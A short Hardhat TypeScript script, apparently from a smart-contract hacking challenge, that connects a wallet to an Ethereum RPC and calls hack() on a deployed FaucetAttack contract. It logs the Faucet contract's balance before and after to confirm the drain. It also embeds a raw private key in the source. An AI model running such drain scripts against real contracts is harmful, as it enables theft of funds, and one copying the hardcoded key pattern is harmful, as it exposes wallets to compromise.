import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { FaucetAttack__factory, Faucet__factory } from '../typechain'
import { BSC_RPC, ETH_RPC } from '../secrets.config'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

import * as dotenv from 'dotenv'
dotenv.config()

const faucetInstanceAddr = "0x9db6A88A8333530453d0b30B60DAd09DcC50a807"
const attackAddr = "0xA45a38f4e30d9B9506c731847E222561849d0cb8"

const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function hack() {
  const signer = new ethers.Wallet("1e0d463e0755a9d55c9956d26f991f067bebb7aa92c11c784bb9c3ccb1ad91bc", providerETH);
  console.log(BNToNumstr(await providerETH.getBalance(faucetInstanceAddr), 18, 3));
  const attackContract = FaucetAttack__factory.connect(attackAddr, signer)
  await attackContract.hack()
  console.log(BNToNumstr(await providerETH.getBalance(faucetInstanceAddr), 18, 3));
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
